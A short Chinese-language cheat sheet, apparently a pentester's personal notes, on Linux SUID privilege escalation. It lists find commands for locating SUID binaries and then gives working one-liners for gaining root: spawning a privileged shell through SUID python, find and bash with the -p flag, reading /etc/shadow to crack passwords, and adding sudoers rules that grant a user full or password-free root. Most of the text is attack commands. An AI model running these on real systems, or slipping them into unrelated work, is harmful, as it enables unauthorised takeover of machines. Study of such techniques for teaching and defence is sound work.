suid提权，即利用拥有root命令的二进制文件进行提权：

find / -user root -perm -4000 -print 2>/dev/null    查找 root 用户拥有的 SUID 文件并打印路径
find / -perm -u=s -type f 2>/dev/null    查找所有具备 SUID 权限的普通文件
find / -user root -perm -4000 -exec ls {} \; 2>/dev/null    查找 root 用户拥有的 SUID 文件并显示详细信息
以上三条命令用于寻找拥有suid权限的文件

一：root权限编辑器
  一个拥有root权限的编辑器是非常可怕的，直接查看shadow文件爆破密码，添加新的用户， 
  或者直接更改/etc/sudoers文件使得普通用户拥有root权限：
  '''
  添加授权规则
  添加一条规则来允许特定的普通用户以 root 身份执行所有命令。例如，如果你要让名为 your_username 的普通用户拥有 root 权限，可以添加如下规则：
  
  your_username ALL=(ALL:ALL) ALL
  
  这里规则的各个部分含义如下：
  your_username：表示要赋予权限的普通用户的用户名。
  ALL：表示该用户可以从任何主机登录并执行 sudo 命令。
  (ALL:ALL)：表示该用户可以以任何用户（冒号前部分）和任何用户组（冒号后部分）的身份执行命令，通常情况下默认就是以 root 用户身份执行。
  ALL：表示该用户可以执行任何命令。
  
  如果你希望该用户在执行 sudo 命令时无需输入密码，可以添加 NOPASSWD 选项，规则如下：
  
  your_username ALL=(ALL:ALL) NOPASSWD: ALL
  '''

二：python解释器拥有suid权限
这很可怕，所有python脚本都将以root权限执行，比如反弹shell，或者

  python -c 'import os;os.execl("/bin/sh", "sh", "-p")'
直接用python新建一个终端(root)

三：find  拥有suid权限
利用命令：
touch anyfile #必须要有这个文件
find anyfile -exec whoami \;
find . -exec /bin/sh -p \; -quit

四：bash拥有suid权限(不至于，要是这个都有，那反弹shell刚拿到shell就已经是root了）
利用命令：
bash -p

五：其他可执行文件的一般suid二进制文件
由于利用方式比较特殊，所以放在了该目录下的‘一般类suid文件利用方式’这个文件夹中
